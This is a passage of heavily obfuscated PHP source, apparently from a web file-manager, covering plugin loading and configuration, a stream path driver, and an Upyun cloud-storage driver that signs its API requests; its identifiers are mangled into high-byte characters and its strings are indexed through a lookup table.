$İÜ÷ŠÄ[$áŠóæëŠ[$Â•ÁçÑï[515]]]; $²Ç¹‚ö€ = _get($íÛÉ“ç, $Â•ÁçÑï[598]); if (!$íÛÉ“ç || !$²Ç¹‚ö€ || !$®”äë[$²Ç¹‚ö€] || !$Àò…Û‘š) { continue; } if (!in_array($áŠóæëŠ[$Â•ÁçÑï[515]], $®”äë[$²Ç¹‚ö€])) { continue; } if (!$Õ¾ ®ˆ•[$Àò…Û‘š]) { $Õ¾ ®ˆ•[$Àò…Û‘š] = array(); } $Õ¾ ®ˆ•[$Àò…Û‘š][] = $²Ç¹‚ö€; } foreach ($Õ¾ ®ˆ• as $Àò…Û‘š => $±ìÌÛ–¯) { if (count($±ìÌÛ–¯) != count($®”äë)) { continue; } $·™ï„[] = $Àò…Û‘š; } if (!$ïö¼áº) { $·™ï„ = array_to_keyvalue($ú¯À‰ÌÇ, $Â•ÁçÑï[12], $Â•ÁçÑï[87]); } $·™ï„ = array_unique($·™ï„); if (!$·™ï„) { return array(); } $íúÊµÁ = array($Â•ÁçÑï[506] => array($Â•ÁçÑï[507], $·™ï„), $Â•ÁçÑï[589] => $§Œ”Øù, $Â•ÁçÑï[188] => SourceModel::TYPE_GROUP); $Èœ½Ò¾à = Model($Â•ÁçÑï[1530])->listSource($íúÊµÁ); if (!$Èœ½Ò¾à || count($·™ï„) == $Èœ½Ò¾à[$Â•ÁçÑï[443]][$Â•ÁçÑï[444]]) { return $Èœ½Ò¾à; } $Úî§×„Ç = array(); $òïÕğ¾Å = array_to_keyvalue($Èœ½Ò¾à[$Â•ÁçÑï[85]], $Â•ÁçÑï[12], $Â•ÁçÑï[191]); $§µ€Õ± = array_to_keyvalue($Èœ½Ò¾à[$Â•ÁçÑï[86]], $Â•ÁçÑï[12], $Â•ÁçÑï[191]); $©§ŒÎ = array_merge($§µ€Õ±, $òïÕğ¾Å); foreach ($·™ï„ as $Àò…Û‘š) { if (!in_array($Àò…Û‘š, $©§ŒÎ)) { $Úî§×„Ç[] = $Àò…Û‘š; } } if ($Úî§×„Ç) { $this->removeBySource($§Œ”Øù, $Úî§×„Ç); } return $Èœ½Ò¾à; } protected function addToTag($ÕæúÛ³Ó, $¬¡Ã«÷ä, $¤ù¼ĞÙä) { $Î©ìº—× =& $_SERVER[œ—üé‹ê]; if (!$this->getByTagID($ÕæúÛ³Ó, $¤ù¼ĞÙä) || !$¬¡Ã«÷ä) { return !1; } if (!Model($Î©ìº—×[942])->pathInfo($¬¡Ã«÷ä)) { return !1; } $ä•·§Ø  = array($Î©ìº—×[1965] => 0, $Î©ìº—×[573] => $¤ù¼ĞÙä, $Î©ìº—×[510] => $¬¡Ã«÷ä, $Î©ìº—×[511] => $Î©ìº—×[2299] . $ÕæúÛ³Ó, $Î©ìº—×[509] => $Î©ìº—×[12], $Î©ìº—×[2182] => 0); if ($this->where($ä•·§Ø )->find()) { return !1; } return $this->add($ä•·§Ø ); } protected function removeFromTag($êÑ®•Ñ, $¿ğëöØ², $ëôÏÚÎ) { $ùİ­—ùÚ =& $_SERVER[œ—üé‹ê]; if (!$this->getByTagID($êÑ®•Ñ, $ëôÏÚÎ) || !$¿ğëöØ²) { return !1; } if (is_array($¿ğëöØ²)) { $¿ğëöØ² = array($ùİ­—ùÚ[7], $¿ğëöØ²); } $¨šÃ§†Ú = array($ùİ­—ùÚ[1965] => 0, $ùİ­—ùÚ[573] => $ëôÏÚÎ, $ùİ­—ùÚ[511] => $ùİ­—ùÚ[2299] . $êÑ®•Ñ, $ùİ­—ùÚ[510] => $¿ğëöØ²); return $this->where($¨šÃ§†Ú)->delete(); } protected function removeByTag($Æ‰óÑ°ƒ, $âö¸òÀã) { $õ÷˜¦æ¬ =& $_SERVER[œ—üé‹ê]; if (!$this->getByTagID($Æ‰óÑ°ƒ, $âö¸òÀã)) { return !1; } $ºö¼‰ˆ¿ = array($õ÷˜¦æ¬[1965] => 0, $õ÷˜¦æ¬[573] => $âö¸òÀã, $õ÷˜¦æ¬[511] => $õ÷˜¦æ¬[2299] . $Æ‰óÑ°ƒ); return $this->where($ºö¼‰ˆ¿)->delete(); } protected function removeBySource($ÚÓÀ¥ˆ, $ƒÂŠÂß¾) { $³×ĞËƒÅ =& $_SERVER[œ—üé‹ê]; if (!$ÚÓÀ¥ˆ || !$ƒÂŠÂß¾) { return !1; } if (is_array($ƒÂŠÂß¾)) { $ƒÂŠÂß¾ = array($³×ĞËƒÅ[7], $ƒÂŠÂß¾); } $ÑË×ããò = array($³×ĞËƒÅ[1965] => 0, $³×ĞËƒÅ[510] => $ƒÂŠÂß¾, $³×ĞËƒÅ[573] => array($³×ĞËƒÅ[1181], 0), $³×ĞËƒÅ[511] => $³×ĞËƒÅ[2299] . $ÚÓÀ¥ˆ); return $this->where($ÑË×ããò)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\160\154\165\x67\x69\156\x4c\151\163\x74"; public $field = array("\156\141\155\145", "\x73\x74\141\x74\x75\x73", "\x72\x65\x67\151\x65\x73\x74", "\x63\157\156\146\x69\147"); public function loadList($Şİ‡¾– = false) { $çúã¥Óç = array_to_keyvalue($this->listData(), $_SERVER[œ—üé‹ê][32]); if ($Şİ‡¾–) { return $çúã¥Óç[$Şİ‡¾–]; } return $çúã¥Óç; } public function init() { $ èÙ¬ˆ– =& $_SERVER[œ—üé‹ê]; Hook::trigger($ èÙ¬ˆ–[2300]); $Ö«€„… = $this->loadPluginList(); foreach ($Ö«€„… as $íê´ù‘ñ => $©ğ‹ÂŞÃ) { $ŸÖ±¥ç¤ = $this->appAllow($íê´ù‘ñ, $©ğ‹ÂŞÃ); if (!$ŸÖ±¥ç¤) { continue; } foreach ($©ğ‹ÂŞÃ[$ èÙ¬ˆ–[2301]] as $ÜŠ’¨â• => $îÍ‰²ÉÏ) { Hook::bind($ÜŠ’¨â•, $îÍ‰²ÉÏ); } } Hook::trigger($ èÙ¬ˆ–[2302]); Hook::trigger(ACTION); } public function appAllow($ª„ƒå Ï, $¢¡Æƒ”Û, $•º¢áµ™ = true) { $”øÀÙâ« =& $_SERVER[œ—üé‹ê]; $¿šæ™½è = PLUGIN_DIR . $ª„ƒå Ï . $”øÀÙâ«[2303]; if (!is_array($¢¡Æƒ”Û) || !is_array($¢¡Æƒ”Û[$”øÀÙâ«[2301]]) || $¢¡Æƒ”Û[$”øÀÙâ«[859]] != 1 || !is_file($¿šæ™½è)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$”øÀÙâ«[6]][$”øÀÙâ«[2304]] || !$GLOBALS[$”øÀÙâ«[6]][$”øÀÙâ«[2305]]) { return !0; } $ØÃÜ–ìù = explode($”øÀÙâ«[50], strtolower($GLOBALS[$”øÀÙâ«[6]][$”øÀÙâ«[2305]])); return in_array(strtolower($ª„ƒå Ï), $ØÃÜ–ìù) ? !1 : !0; } if ($•º¢áµ™ && !Action($”øÀÙâ«[2306])->checkAuth($ª„ƒå Ï)) { return !1; } return !0; } public function unInstall($½åÔ¿ç§) { $™Æñùò¨ =& $_SERVER[œ—üé‹ê]; $õ¤Š˜­ = $this->loadList($½åÔ¿ç§); if (file_exists(PLUGIN_DIR . $½åÔ¿ç§)) { Hook::apply($½åÔ¿ç§ . $™Æñùò¨[2307]); } $this->remove($õ¤Š˜­[$™Æñùò¨[487]]); } public function changeStatus($Å¡ú»Ì, $¸Üè¬—) { $ºŸİôğ« =& $_SERVER[œ—üé‹ê]; $Ï¢‡ÛöØ = $this->loadList($Å¡ú»Ì); if ($¸Üè¬—) { Hook::apply($Å¡ú»Ì . $ºŸİôğ«[2308]); } $this->update($Ï¢‡ÛöØ[$ºŸİôğ«[487]], array($ºŸİôğ«[2309] => $¸Üè¬—)); } public function appRegist($ÕâÊ¼¡¬, $¤ê‹éµË) { $è†¨Ùö× =& $_SERVER[œ—üé‹ê]; $¨šãÒÕ• = $this->loadList($ÕâÊ¼¡¬); if ($¨šãÒÕ•) { $this->update($¨šãÒÕ•[$è†¨Ùö×[487]], array($è†¨Ùö×[2301] => $¤ê‹éµË)); } else { $»•ê×î‘ = array($è†¨Ùö×[32] => $ÕâÊ¼¡¬, $è†¨Ùö×[2301] => $¤ê‹éµË, $è†¨Ùö×[859] => 0, $è†¨Ùö×[6] => $this->getConfigDefault($ÕâÊ¼¡¬)); $this->insert($»•ê×î‘); } } public function getConfigDefault($Ÿ³¾ğá¸) { $—·ã¦«¹ =& $_SERVER[œ—üé‹ê]; $ÊâÅëğù = array(); $°š³ÆáŞ = $this->getPackageJson($Ÿ³¾ğá¸); if (!$°š³ÆáŞ && is_array($°š³ÆáŞ[$—·ã¦«¹[2310]])) { return $ÊâÅëğù; } foreach ($°š³ÆáŞ[$—·ã¦«¹[2310]] as $Ÿ®‚¦ => $´¸×Ìëİ) { if (!isset($´¸×Ìëİ[$—·ã¦«¹[451]]) || isset($ÊâÅëğù[$Ÿ®‚¦])) { continue; } $ÊâÅëğù[$Ÿ®‚¦] = $´¸×Ìëİ[$—·ã¦«¹[451]]; } return $ÊâÅëğù; } public function getPackageJson($º€ùò©¾) { return Hook::apply($º€ùò©¾ . $_SERVER[œ—üé‹ê][2311]); } public function getConfig($ˆÖïÙüÉ, $óÍÔ²¢Å = false) { $Ñõ¨ÕîÚ =& $_SERVER[œ—üé‹ê]; $Áï–¬‰ = array(); $Î¼ˆàŠ¦ = $this->loadList($ˆÖïÙüÉ); if ($Î¼ˆàŠ¦ && is_array($Î¼ˆàŠ¦[$Ñõ¨ÕîÚ[6]])) { $Áï–¬‰ = $Î¼ˆàŠ¦[$Ñõ¨ÕîÚ[6]]; } if (!$Áï–¬‰ || $óÍÔ²¢Å) { $Áï–¬‰ = $this->getConfigDefault($ˆÖïÙüÉ); } return $Áï–¬‰; } public function setConfig($¤ªŞô”, $›è´İ°‰ = false) { $âşøì‘Ô =& $_SERVER[œ—üé‹ê]; $™²áÇëµ = $this->loadList($¤ªŞô”); if (!$™²áÇëµ) { return !1; } $ÖÅ•™¥î = $™²áÇëµ[$âşøì‘Ô[6]]; if ($›è´İ°‰ == !1) { $ÖÅ•™¥î = array(); $›è´İ°‰ = $this->getConfigDefault($¤ªŞô”); } foreach ($›è´İ°‰ as $¨ÄêèÏ§ => $ƒÎıƒ­“) { $ÖÅ•™¥î[$¨ÄêèÏ§] = is_string($ƒÎıƒ­“) ? trim($ƒÎıƒ­“) : $ƒÎıƒ­“; } $this->update($™²áÇëµ[$âşøì‘Ô[487]], array($âşøì‘Ô[6] => $ÖÅ•™¥î)); } public function viewList() { $÷¹¶Õ =& $_SERVER[œ—üé‹ê]; $Ñ˜”‰Ïı = $this->loadList(); $this->pluginScan($Ñ˜”‰Ïı); $Ñ˜”‰Ïı = $this->loadPluginList(); $èŠ­äÆù = array(); foreach ($Ñ˜”‰Ïı as $áÁÏû¶ => $ˆ Éëˆõ) { $•©­Ö…Ş = $ˆ Éëˆõ; unset($ˆ Éëˆõ[$÷¹¶Õ[2301]], $ˆ Éëˆõ[$÷¹¶Õ[6]]); $–Ö¾î¿Ô = PLUGIN_DIR . $ˆ Éëˆõ[$÷¹¶Õ[32]] . $÷¹¶Õ[2303]; if (!is_file($–Ö¾î¿Ô)) { continue; } $°ãã¹‰ß = Hook::apply($ˆ Éëˆõ[$÷¹¶Õ[32]] . $÷¹¶Õ[2311]); if (!is_array($°ãã¹‰ß)) { continue; } $èŠ­äÆù[$áÁÏû¶] = array_merge($ˆ Éëˆõ, $°ãã¹‰ß); if ($•©­Ö…Ş[$÷¹¶Õ[6]][$÷¹¶Õ[1886]] != $°ãã¹‰ß[$÷¹¶Õ[1860]]) { Hook::apply($ˆ Éëˆõ[$÷¹¶Õ[32]] . $÷¹¶Õ[2308]); $•©­Ö…Ş[$÷¹¶Õ[6]][$÷¹¶Õ[1886]] = $°ãã¹‰ß[$÷¹¶Õ[1860]]; $this->update($ˆ Éëˆõ[$÷¹¶Õ[487]], array($÷¹¶Õ[6] => $•©­Ö…Ş[$÷¹¶Õ[6]])); } } return $èŠ­äÆù; } private function loadPluginList() { $üáÎõöû =& $_SERVER[œ—üé‹ê]; $¼éØ – = $this->loadList(); if (strtolower(MOD) == $üáÎõöû[2312]) { return $¼éØ –; } $¸éå«Œ = Hook::trigger($üáÎõöû[2313], $¼éØ –); if ($¼éØ – && !$¸éå«Œ) { die; } return $¸éå«Œ ? $¸éå«Œ : $¼éØ –; } private function pluginScan($©è€Ø¿¼) { $ê´¡ĞÕñ =& $_SERVER[œ—üé‹ê]; recursion_dir(PLUGIN_DIR, $×ò™…²¥, $Á®”¤°ğ, 0); foreach ($×ò™…²¥ as $°÷µíÏİ) { $ÃÁ˜÷Ë« = get_path_this($°÷µíÏİ); if (isset($©è€Ø¿¼[$ÃÁ˜÷Ë«]) || !file_exists($°÷µíÏİ . $ê´¡ĞÕñ[2314]) || !file_exists($°÷µíÏİ . $ê´¡ĞÕñ[2303])) { continue; } Hook::apply($ÃÁ˜÷Ë« . $ê´¡ĞÕñ[2308]); } } } goto e±ÅÍÒº÷Ğ; DÊ’Ş‚îí: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Ü­ä³¥ï, $‘¤·ÉşŸ = 0) { parent::__construct(); $this->source = $Ü­ä³¥ï; $this->sourceSize = $‘¤·ÉşŸ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Ïò•ÕìÆ = false) { return $this->sourceSize; } public function getContent($»®´‰“· = false) { return $this->fileSubstr($»®´‰“·, 0, $this->sourceSize); } public function fileSubstr($±‚ö§´ø = false, $•ˆ¦ĞïÆ = 0, $¤Ì´Ç¨ = 0) { if (!$¤Ì´Ç¨) { $¤Ì´Ç¨ = $this->sourceSize; } $Ä¾­Æ­Î = $this->sourceSize - $•ˆ¦ĞïÆ; if ($¤Ì´Ç¨ >= $Ä¾­Æ­Î) { $¤Ì´Ç¨ = $Ä¾­Æ­Î; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $•ˆ¦ĞïÆ, $¤Ì´Ç¨); } if ($this->sourceType == self::TYPE_FILE) { if ($¤Ì´Ç¨ <= 0) { return $_SERVER[œ—üé‹ê][12]; } $Ş¢·§ÚŠ = ftell($this->source); fseek_64($this->source, $Ş¢·§ÚŠ + $•ˆ¦ĞïÆ); $•ÈÈÇ½Ø = @fread($this->source, $¤Ì´Ç¨); fseek_64($this->source, $Ş¢·§ÚŠ); return $•ÈÈÇ½Ø; } } public function hashMd5($Œ²¯îÚ = false) { return md5($this->getContent()); } public static function hash($öØä§§ò, $õş¹Ä€Û = 0) { $İã©½¢® = new PathDriverStream($öØä§§ò, $õş¹Ä€Û); return $İã©½¢®->hashSimple($öØä§§ò); } public static function md5($›ÄŠ»¿Ë, $Õ°¨¤ïƒ = 0) { $ÕàªïÉº = new PathDriverStream($›ÄŠ»¿Ë, $Õ°¨¤ïƒ); return $ÕàªïÉº->hashMd5($›ÄŠ»¿Ë); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\72\x2f\x2f\166\60\56\141\x70\151\x2e\x75\x70\171\x75\x6e\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ÅµÍÊŸÙ) { parent::__construct(); $this->_init($ÅµÍÊŸÙ); } public function _init($Ï•ª»³¥) { $ıÆÆŠ­” =& $_SERVER[œ—üé‹ê]; foreach ($Ï•ª»³¥ as $ÎÜ¡¼Šê => $ĞêÎùÂ) { if (isset($this->{$ÎÜ¡¼Šê})) { $this->{$ÎÜ¡¼Šê} = $ĞêÎùÂ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ıÆÆŠ­”[1746] . LNG($ıÆÆŠ­”[1669])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Ç´ü‡÷Í, $û‘•òÉš = "\x47\105\x54") { $€í÷î¹Ì =& $_SERVER[œ—üé‹ê]; $×´ášî = gmdate($€í÷î¹Ì[1698]); $ª±—® = base64_encode(hash_hmac($€í÷î¹Ì[1747], "{$û‘•òÉš}\x26{$Ç´ü‡÷Í}\46{$×´ášî}", md5("{$this->userpass}"), !0)); $¡‘ „œ† = array("\x41\x75\164\150\x6f\162\x69\172\141\x74\151\157\156\72\125\120\131\x55\x4e\x20{$this->username}\x3a{$ª±—®}", "\x44\x61\x74\145\72{$×´ášî}"); return $¡‘ „œ†; } public function ussRequest($Íßî±½“, $‹í¤©²ï = "\x47\x45\x54", $µ˜ÓØ›Æ = false, $àõÇ‰â¥ = false, $ÍŞí‰ = false) { $ÊáØš™å =& $_SERVER[œ—üé‹ê]; $Íßî±½“ = trim($Íßî±½“, $ÊáØš™å[8]); $â÷²»¥ = "\57{$this->bucket}\57" . rawurlencode($Íßî±½“); $üÌ±å“© = $this->ussHeaders($â÷²»¥, $‹í¤©²ï); if ($àõÇ‰â¥) { $üÌ±å“© = array_merge($üÌ±å“©, $àõÇ‰â¥); } $”±€ü›‘ = url_request($this->endpoint . $â÷²»¥, $‹í¤©²ï, $µ˜ÓØ›Æ, $üÌ±å“©, $ÍŞí‰); if (!$”±€ü›‘) { $ÀÑˆşÀÆ = LNG($ÊáØš™å[1748]); $this->writeLog($ÀÑˆşÀÆ); return array($ÊáØš™å[1398] => !1, $ÊáØš™å[1388] => $ÀÑˆşÀÆ); } if (strtolower($‹í¤©²ï) == $ÊáØš™å[227] || in_array($”±€ü›‘[$ÊáØš™å[1398]], array($ÊáØš™å[261], $ÊáØš™å[1749]))) { $µ˜ÓØ›Æ = $”±€ü›‘[$ÊáØš™å[1750]]; if (!$”±€ü›‘[$ÊáØš™å[859]]) { $µ˜ÓØ›Æ = isset($µ˜ÓØ›Æ[0]) ? $µ˜ÓØ›Æ[0] : $ÊáØš™å[12]; } } else { $µ˜ÓØ›Æ = json_decode($”±€ü›‘[$ÊáØš™å[1388]], !0); if (!$µ˜ÓØ›Æ) { $µ˜ÓØ›Æ = $”±€ü›‘[$ÊáØš™å[1388]]; } else { if (!$”±€ü›‘[$ÊáØš™å[859]] && isset($µ˜ÓØ›Æ[$ÊáØš™å[1751]])) { $µ˜ÓØ›Æ = $µ˜ÓØ›Æ[$ÊáØš™å[1751]]; } } } if (!$”±€ü›‘[$ÊáØš™å[859]]) { $this->writeLog($this->__errorMessage($µ˜ÓØ›Æ)); } return array($ÊáØš™å[1398] => $”±€ü›‘[$ÊáØš™å[859]], $ÊáØš™å[1388] => $µ˜ÓØ›Æ); } private function __errorMessage($“Ê¾¬—) { $³º‚…¯Ï =& $_SERVER[œ—üé‹ê]; if (!$“Ê¾¬—) { return $³º‚…¯Ï[12]; } static $¢Ò“‚ = null; if (!$¢Ò“‚) { $¢Ò“‚ = I18n::getType(); } if ($¢Ò“‚ != $³º‚…¯Ï[1706]) { return $“Ê¾¬—; } $°¨÷ìÔß = array($³º‚…¯Ï[1752] => $³º‚…¯Ï[1753], $³º‚…¯Ï[1754] => $³º‚…¯Ï[1755], $³º‚…¯Ï[1756] => $³º‚…¯Ï[1755], $³º‚…¯Ï[1757] => $³º‚…¯Ï[1758], $³º‚…¯Ï[1759] => $³º‚…¯Ï[1760], $³º‚…¯Ï[1761] => $³º‚…¯Ï[1762], $³º‚…¯Ï[1763] => $³º‚…¯Ï[1764]); return isset($°¨÷ìÔß[$“Ê¾¬—]) ? $°¨÷ìÔß[$“Ê¾¬—] : $“Ê¾¬—; } public function mkfile($Î¾ş·õÕ, $Úš™´“İ = '', $åÑŸš = REPEAT_RENAME) { if ($this->setContent($Î¾ş·õÕ, $Úš™´“İ)) { return $this->getPathOuter($Î¾ş·õÕ); } return !1; } public function mkdir($àµ“èûÍ, $»îÆ´¥Ì = REPEAT_SKIP) { $õ§šˆìú =& $_SERVER[œ—üé‹ê]; $“Ûê·´ = trim($àµ“èûÍ, $õ§šˆìú[8]); if ($this->_isFolder($“Ûê·´)) { return $this->getPathOuter($“Ûê·´); } $¡½™–ÖÎ = array($õ§šˆìú[1765]); $´ÅÃ©ìñ = $this->ussRequest($“Ûê·´, $õ§šˆìú[288], !1, $¡½™–ÖÎ); return $´ÅÃ©ìñ[$õ§šˆìú[1398]] ? $this->getPathOuter($“Ûê·´) : !1; } public function copyFile($˜ÎÓøê½, $½Şø–Ïè) { $çŒ´Ì¾ =& $_SERVER[œ—üé‹ê]; $“³¤ÛØ¤ = array($çŒ´Ì¾[1766] . "\x2f{$this->bucket}\x2f{$˜ÎÓøê½}", $çŒ´Ì¾[1767]); $æÖ¾õ× = $this->ussRequest($½Şø–Ïè, $çŒ´Ì¾[253], !1, $“³¤ÛØ¤); return $æÖ¾õ×[$çŒ´Ì¾[1398]] ? !0 : $this->getPathOuter($½Şø–Ïè); } public function moveFile($æº×„Á, $²ØÇäÑ›) { $ğÜ©ì»¾ =& $_SERVER[œ—üé‹ê]; $£ÉªĞüá = array($ğÜ©ì»¾[1768] . "\57{$this->bucket}\x2f{$æº×„Á}", $ğÜ©ì»¾[1767]); $ƒø¡Õ—ö = $this->ussRequest($²ØÇäÑ›, $ğÜ©ì»¾[253], !1, $£ÉªĞüá); return $ƒø¡Õ—ö[$ğÜ©ì»¾[1398]] ? !0 : $this->getPathOuter($²ØÇäÑ›); } public function delFile($Î›íöñ) { $ŒßÒåû =& $_SERVER[œ—üé‹ê]; $ÔÙ†ı²ü = $this->ussRequest($Î›íöñ, $ŒßÒåû[1769]); return $ÔÙ†ı²ü[$ŒßÒåû[1398]] ? !0 : !1; } public function delFolder($‡°Æªôß) { $Ãã¡´ï =& $_SERVER[œ—üé‹ê]; if (!$this->exist($‡°Æªôß)) { return !0; } $this->listItemCache = !1; $–õüòñ« = $…Ëéƒ‘ = array(); $this->fileList($‡°Æªôß, $–õüòñ«, $…Ëéƒ‘, !0); $this->listItemCache = !0; foreach ($…Ëéƒ‘ as $ô—­À³£) { $«æüÜŠ¦ = $this->ussRequest($ô—­À³£[$Ãã¡´ï[32]], $Ãã¡´ï[1769]); if (!$«æüÜŠ¦[$Ãã¡´ï[1398]]) { return !1; } } usort($–õüòñ«, function ($•Ëì¶Ì®, $—‚‡¨¤Ø) { $à¶¨˜ı® =& $_SERVER[œ—üé‹ê]; return substr_count($—‚‡¨¤Ø, $à¶¨˜ı®[8]) - substr_count($•Ëì¶Ì®, $à¶¨˜ı®[8]); }); foreach ($–õüòñ« as $«ÕôÛÄ¯) { $«æüÜŠ¦ = $this->ussRequest($«ÕôÛÄ¯, $Ãã¡´ï[1769]); if (!$«æüÜŠ¦[$Ãã¡´ï[1398]]) { return !1; } } $«æüÜŠ¦ = $this->ussRequest($‡°Æªôß, $Ãã¡´ï[1769]); return $«æüÜŠ¦[$Ãã¡´ï[1398]]; } public function rename($¥Ø‰Îı¨, $Ìã…ÛÊ) { if ($this->isFile($¥Ø‰Îı¨)) { $Ìã…ÛÊ = get_path_father($¥Ø‰Îı¨) . $Ìã…ÛÊ; return $this->moveFile($¥Ø‰Îı¨, $Ìã…ÛÊ); } return $this->renameObject($¥Ø‰Îı¨, $Ìã…ÛÊ); } public function fileInfo($›Ñ³†â«, $µ¥¿¦¥ñ = false, $ª´ä‰…ğ = array()) { $€²Çæ¥Ğ =& $_SERVER[œ—üé‹ê]; $½¸ãœôÛ = array($€²Çæ¥Ğ[32] => $this->pathThis($›Ñ³†â«), $€²Çæ¥Ğ[87] => $this->getPathOuter($€²Çæ¥Ğ[8] . $›Ñ³†â«), $€²Çæ¥Ğ[33] => $€²Çæ¥Ğ[230], $€²Çæ¥Ğ[79] => isset($ª´ä‰…ğ[$€²Çæ¥Ğ[79]]) ? $ª´ä‰…ğ[$€²Çæ¥Ğ[79]] : 0, $€²Çæ¥Ğ[166] => $this->ext($›Ñ³†â«)); if ($µ¥¿¦¥ñ) { return $½¸ãœôÛ; } $½¸ãœôÛ[$€²Çæ¥Ğ[231]] = $½¸ãœôÛ[$€²Çæ¥Ğ[88]] = 0; $½¸ãœôÛ[$€²Çæ¥Ğ[232]] = $½¸ãœôÛ[$€²Çæ¥Ğ[233]] = !0; if (empty($ª´ä‰…ğ)) { $ª´ä‰…ğ = $this->objectMeta($›Ñ³†â«); if (!$ª´ä‰…ğ) { return $½¸ãœôÛ; } } $½¸ãœôÛ[$€²Çæ¥Ğ[231]] = intval($ª´ä‰…ğ[$€²Çæ¥Ğ[1770]]); $½¸ãœôÛ[$€²Çæ¥Ğ[88]] = intval($ª´ä‰…ğ[$€²Çæ¥Ğ[1771]]); $½¸ãœôÛ[$€²Çæ¥Ğ[79]] = $ª´ä‰…ğ[$€²Çæ¥Ğ[79]]; return $½¸ãœôÛ; } public function folderInfo($Œ„Ìç˜, $øœØáüù = false) { $¥È¬’ìŠ =& $_SERVER[œ—üé‹ê]; $–ıı ëç = array($¥È¬’ìŠ[32] => $this->pathThis($Œ„Ìç˜), $¥È¬’ìŠ[87] => $this->getPathOuter($¥È¬’ìŠ[8] . $Œ„Ìç˜), $¥È¬’ìŠ[33] => $¥È¬’ìŠ[78]); if ($øœØáüù) { return $–ıı ëç; } $–ıı ëç[$¥È¬’ìŠ[231]] = $–ıı ëç[$¥È¬’ìŠ[88]] = 0; $–ıı ëç[$¥È¬’ìŠ[232]] = $–ıı ëç[$¥È¬’ìŠ[233]] = !0; if (empty($¯ö©¤ËÈ)) { $¯ö©¤ËÈ = $this->objectMeta($Œ„Ìç˜); if (!$¯ö©¤ËÈ) { return $–ıı ëç; } } $–ıı ëç[$¥È¬’ìŠ[231]] = intval($¯ö©¤ËÈ[$¥È¬’ìŠ[1770]]); $–ıı ëç[$¥È¬’ìŠ[88]] = intval($¯ö©¤ËÈ[$¥È¬’ìŠ[1771]]); return $–ıı ëç; } private function listObjs($Ñ¬“Ş¢, $¡¨¢‡­¶ = 0, $á‹‡Ù – = 1000) { $¤úˆŸ•ì =& $_SERVER[œ—üé‹ê]; $‰”Ç¼†÷ = array($¤úˆŸ•ì[1772], $¤úˆŸ•ì[1773] . $á‹‡Ù –); if ($¡¨¢‡­¶) { $‰”Ç¼†÷[] = $¤úˆŸ•ì[1774] . $¡¨¢‡­¶; } $È•Õì–« = $this->ussRequest($Ñ¬“Ş¢, $¤úˆŸ•ì[1602], !1, $‰”Ç¼†÷); return !$È•Õì–«[$¤úˆŸ•ì[1398]] ? !1 : $È•Õì–«[$¤úˆŸ•ì[1388]]; } private function fileList($ ³šé€Ô, &$®€ÜØ×º, &$Š‚’¤±, $Ê€©è°ç = false) { $‡¼ş›Ò“ =& $_SERVER[œ—üé‹ê]; $òõ—ûÏ‚ = $‡¼ş›Ò“[12]; $ÂïÇŞĞÃ = 1000; $´äË€ß = rtrim($ ³šé€Ô, $‡¼ş›Ò“[8]) . $‡¼ş›Ò“[8]; while (!0) { check_abort(); $…©ú­šº = $this->listObjs($ ³šé€Ô, $òõ—ûÏ‚, $ÂïÇŞĞÃ); if (!$…©ú­šº) { return !1; } $òõ—ûÏ‚ = isset($…©ú­šº[$‡¼ş›Ò“[1775]]) ? $…©ú­šº[$‡¼ş›Ò“[1775]] : $‡¼ş›Ò“[12]; $Û€ß‰«Æ = isset($…©ú­šº[$‡¼ş›Ò“[1776]]) ? $…©ú­šº[$‡¼ş›Ò“[1776]] : array(); foreach ($Û€ß‰«Æ as $®İÒÕ“¾) { $÷£•‚´¹ = $®İÒÕ“¾[$‡¼ş›Ò“[33]] == $‡¼ş›Ò“[78] ? !0 : !1; $­ÒŠ¤£‘ = ltrim($´äË€ß . $®İÒÕ“¾[$‡¼ş›Ò“[32]], $‡¼ş›Ò“[8]) . ($÷£•‚´¹ ? $‡¼ş›Ò“[8] : $‡¼ş›Ò“[12]); $“Ğ…ˆÌ– = array($‡¼ş›Ò“[32] => $­ÒŠ¤£‘, $‡¼ş›Ò“[33] => $÷£•‚´¹ ? $‡¼ş›Ò“[78] : $‡¼ş›Ò“[230], $‡¼ş›Ò“[79] => $®İÒÕ“¾[$‡¼ş›Ò“[412]], $‡¼ş›Ò“[1771] => $®İÒÕ“¾[$‡¼ş›Ò“[1777]]); $this->cacheMethodInfoSet($­ÒŠ¤£‘, $÷£•‚´¹, $“Ğ…ˆÌ–); if ($÷£•‚´¹) { $®€ÜØ×º[] = $­ÒŠ¤£‘; if ($Ê€©è°ç) { $this->fileList($­ÒŠ¤£‘, $®€ÜØ×º, $Š‚’¤±, $Ê€©è°ç); } continue; } $Š‚’¤±[] = $“Ğ…ˆÌ–; } if (count($Û€ß‰«Æ) < $ÂïÇŞĞÃ) { break; } } $this->cacheMethodInfoSet($ ³šé€Ô, !0); } public function listPath($¥Íä‚óõ, $÷”û©°† = false) { $õĞ€ø» =& $_SERVER[œ—üé‹ê]; $Óš°†à  = $÷ÖÄß«“ = array(); $this->fileList($¥Íä‚óõ, $Óš°†à , $÷ÖÄß«“); foreach ($Óš°†à  as $Ò®ƒìüõ => $Ó¯Û™¼æ) { $Óš°†à [$Ò®ƒìüõ] = $this->folderInfo($Ó¯Û™¼æ, $÷”û©°†); } foreach ($÷ÖÄß«“ as $Ò®ƒìüõ => $Ó¯Û™¼æ) { $÷ÖÄß«“[$Ò®ƒìüõ] = $this->fileInfo($Ó¯Û™¼æ[$õĞ€ø»[32]], $÷”û©°†, $Ó¯Û™¼æ); } return array($õĞ€ø»[85] => $Óš°†à , $õĞ€ø»[86] => $÷ÖÄß«“); } public function has($ë†â–ÔÜ, $‘öûÒ° = false, $³Éš¡¢œ = true) { $Š»ş×ÓÁ =& $_SERVER[œ—üé‹ê]; $á•ºÓÑî = 